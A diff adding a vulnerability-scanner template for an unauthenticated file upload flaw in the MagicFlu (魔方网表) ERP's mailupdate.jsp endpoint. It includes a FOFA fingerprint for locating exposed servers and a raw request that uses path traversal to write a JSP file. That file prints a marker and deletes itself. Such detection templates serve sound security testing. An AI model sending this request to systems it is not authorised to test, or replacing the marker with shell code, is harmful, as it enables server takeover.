@@ -1,0 +1,34 @@
+id: mofangwangbiaoERP-mailupdate_jsp-File-upload
+info:
+  name: 魔方网表ERP mailupdate.jsp 任意文件上传漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: icon_hash="694014318"
+    魔方网表ERP mailupdate.jsp 接口存在文件上传漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://mp.weixin.qq.com/s/HLz-zVZxi3k-T6jToZyxBw
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        GET /magicflu/html/mail/mailupdate.jsp?messageid=/../../../{{username}}.jsp&messagecontent=%3C%25+out.println%28%22pboyjnnrfipmplsukdeczudsefxmywe%22%29%3B+new+java.io.File%28application.getRealPath%28request.getServletPath%28%29%29%29.delete%28%29%3B+%25%3E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
+      - |
+        GET /magicflu/{{username}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
